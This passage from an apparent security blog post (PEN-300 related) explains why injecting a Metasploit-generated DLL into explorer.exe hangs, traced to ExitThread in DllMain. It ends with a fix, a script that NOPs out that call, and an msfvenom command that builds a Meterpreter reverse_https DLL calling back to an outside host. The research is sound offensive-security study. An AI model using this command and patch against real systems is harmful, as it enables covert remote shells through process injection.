&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="running-the-poc">Running the PoC&lt;/h2>
&lt;p>Let&amp;rsquo;s run the &lt;code>Injectee&lt;/code> application and make it load the &lt;code>SampleGood&lt;/code> library to get a base line. Since we&amp;rsquo;re not using any problematic functions, we can see that the library load and unload work correctly and since we&amp;rsquo;re unloading the library after each load, we can load it multiple times.&lt;/p>
&lt;p>&lt;img src="https://reubensammut.github.io/posts/dllmain-and-threads/run-with-samplegood.png"
width="752"
height="455"
srcset="https://reubensammut.github.io/posts/dllmain-and-threads/run-with-samplegood_hu49169600ce0ac9e1fd05a6337d820535_34109_480x0_resize_box_3.png 480w, https://reubensammut.github.io/posts/dllmain-and-threads/run-with-samplegood_hu49169600ce0ac9e1fd05a6337d820535_34109_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Running with SampleGood"
class="gallery-image"
data-flex-grow="165"
data-flex-basis="396px"
>&lt;/p>
&lt;p>As we see from the image above, we can load and unload multiple times, and when we exit the process, everything works correctly. It&amp;rsquo;s important to note that on each load, the main thread outputs &lt;em>&amp;ldquo;Trying to load [library name]&amp;rdquo;&lt;/em>, while the thread created to load and unload the library outputs &lt;em>&amp;quot;[Thread] - Trying to load library&amp;quot;&lt;/em>.&lt;/p>
&lt;p>Let&amp;rsquo;s now run the &lt;code>Injectee&lt;/code> application and load the &lt;code>SampleBad&lt;/code> library.&lt;/p>
&lt;p>&lt;img src="https://reubensammut.github.io/posts/dllmain-and-threads/run-with-samplebad.png"
width="749"
height="455"
srcset="https://reubensammut.github.io/posts/dllmain-and-threads/run-with-samplebad_huf1a87fdc3900ce45cf2a0130c39db0f2_25816_480x0_resize_box_3.png 480w, https://reubensammut.github.io/posts/dllmain-and-threads/run-with-samplebad_huf1a87fdc3900ce45cf2a0130c39db0f2_25816_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Running with SampleBad"
class="gallery-image"
data-flex-grow="164"
data-flex-basis="395px"
>&lt;/p>
&lt;p>There are multiple things that we notice now:&lt;/p>
&lt;ul>
&lt;li>We don&amp;rsquo;t see the message that the DLL has been detached&lt;/li>
&lt;li>When we try to re-load the library, not only is the DLL not re-loaded, we don&amp;rsquo;t even see the message from the thread that we&amp;rsquo;re trying to load a library&lt;/li>
&lt;li>The process hangs when we try to exit the process&lt;/li>
&lt;/ul>
&lt;p>Using the &lt;code>Injector&lt;/code> project in our PoC code, we can also confirm that this happens with &lt;code>CreateRemoteThread&lt;/code>. When we inject the &lt;code>SampleGood&lt;/code> first and then the &lt;code>SampleBad&lt;/code>, both DLLs are loaded, meaning that &lt;code>CreateRemoteThread&lt;/code> ran in both cases (regardless of the fact that after loading &lt;code>SampleBad&lt;/code> we&amp;rsquo;re not able to run it anymore).&lt;/p>
&lt;p>&lt;img src="https://reubensammut.github.io/posts/dllmain-and-threads/inject-good-then-bad.png"
width="752"
height="459"
srcset="https://reubensammut.github.io/posts/dllmain-and-threads/inject-good-then-bad_hub192ea7010beba79611110cad4313271_24453_480x0_resize_box_3.png 480w, https://reubensammut.github.io/posts/dllmain-and-threads/inject-good-then-bad_hub192ea7010beba79611110cad4313271_24453_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Injecting SampleGood first and then SampleBad, we see that both DLLs are loaded"
class="gallery-image"
data-flex-grow="163"
data-flex-basis="393px"
>&lt;/p>
&lt;p>On the contrary, loading &lt;code>SampleBad&lt;/code> first, we see that &lt;code>CreateRemoteThread&lt;/code> does not work when we request to load &lt;code>SampleGood&lt;/code>.&lt;/p>
&lt;p>&lt;img src="https://reubensammut.github.io/posts/dllmain-and-threads/inject-bad-then-good.png"
width="753"
height="376"
srcset="https://reubensammut.github.io/posts/dllmain-and-threads/inject-bad-then-good_hu2836abc0be3441628bace5a906b39fa2_19309_480x0_resize_box_3.png 480w, https://reubensammut.github.io/posts/dllmain-and-threads/inject-bad-then-good_hu2836abc0be3441628bace5a906b39fa2_19309_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Injecting SampleBad first and then SampleGood, we see that only the first DLL is loaded"
class="gallery-image"
data-flex-grow="200"
data-flex-basis="480px"
>&lt;/p>
&lt;h2 id="results">Results&lt;/h2>
&lt;p>From the previous section, we can build a hypothesis about what is happening:&lt;/p>
&lt;ul>
&lt;li>Since we never see the &lt;code>DLL_PROCESS_DETACH&lt;/code> message when &lt;code>ExitThread&lt;/code> is called, we can safely assume that &lt;code>LoadLibrary&lt;/code> never returned. &lt;code>LoadLibrary&lt;/code> should return when a &lt;code>DllMain&lt;/code> returns with any value.&lt;/li>
&lt;li>With the DLL loading/unloading thread stuck in &lt;code>LoadLibrary&lt;/code>, we can also assume that the thread is also still running.&lt;/li>
&lt;li>Both &lt;code>CreateThread&lt;/code> (to load new DLLs) and &lt;code>ExitProcess&lt;/code> (via the return from the main function) are not executing. From our research, we know that &lt;code>ExitThread&lt;/code>, &lt;code>ExitProcess&lt;/code>, &lt;code>CreateThread&lt;/code> and &lt;code>CreateRemoteThread&lt;/code> calls are serialized, meaning only one of them can run within all threads of a process. This suggests some sort of lock that &lt;code>ExitThread&lt;/code> is keeping.&lt;/li>
&lt;/ul>
&lt;p>Research and results show that &lt;code>ExitThread&lt;/code> is indeed the issue. It also suggests that a lock is holding new threads from executing. Going back to our original question &lt;code>explorer.exe&lt;/code> typically creates and destructs threads as needed, so locking the thread creation and deletion process would cause it to malfunction and eventually crash.&lt;/p>
&lt;h2 id="fix">Fix&lt;/h2>
&lt;p>After all this, we concluded that removing &lt;code>ExitThread&lt;/code>, we would be able to correctly inject the DLL generated by &lt;code>msfvenom&lt;/code>. For this reason, I created a python3 script which can be run on both a 64-bit and 32-bit DLL. The script looks for the bytes in the DLL that perform the &lt;code>ExitThread&lt;/code> call and NOPs it out. This script can be found &lt;a class="link" href="https://gist.github.com/reubensammut/958333cd112b6bbe4883787950fc831d" target="_blank" rel="noopener"
>here&lt;/a> and can be run using the following command&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>msfvenom -p windows/x64/meterpreter/reverse_https LHOST&lt;span style="color:#f92672">=&lt;/span>192.168.0.1 LPORT&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">443&lt;/span> &lt;span style="color:#ae81ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">&lt;/span> -f dll -o met.dll
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>python3 remove_exitthread_msf.py met.dll
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="references">References&lt;/h2>
&lt;ul>
&lt;li>&lt;a class="link" href="https://www.offsec.com/courses/pen-300/" target="_blank" rel="noopener"
>PEN-300 Course from OffSec&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://www.metasploit.com/" target="_blank" rel="noopener"
>metasploit framework&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://github.com/reubensammut/InjectPoC" target="_blank" rel="noopener"
>PoC code for this blog post&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://learn.microsoft.com/en-us/windows/win32/dlls/dllmain" target="_blank" rel="noopener"
>DllMain documention on MSDN&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://github.com/rapid7/metasploit-framework/blob/d29f5690a172cbe6741bff9165dc2d133c222ecc/data/templates/src/pe/dll/template.c" target="_blank" rel="noopener"
>DLL template used by metasploit&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-best-practices" target="_blank" rel="noopener"
>Dynamic-Link Library Best Practices&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread" target="_blank" rel="noopener"
>CreateRemoteThread function&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://gist.github.com/reubensammut/958333cd112b6bbe4883787950fc831d" target="_blank" rel="noopener"
>Gist to remove the &lt;code>ExitThread&lt;/code>&lt;/a>&lt;/li>
&lt;/ul></description></item></channel></rss>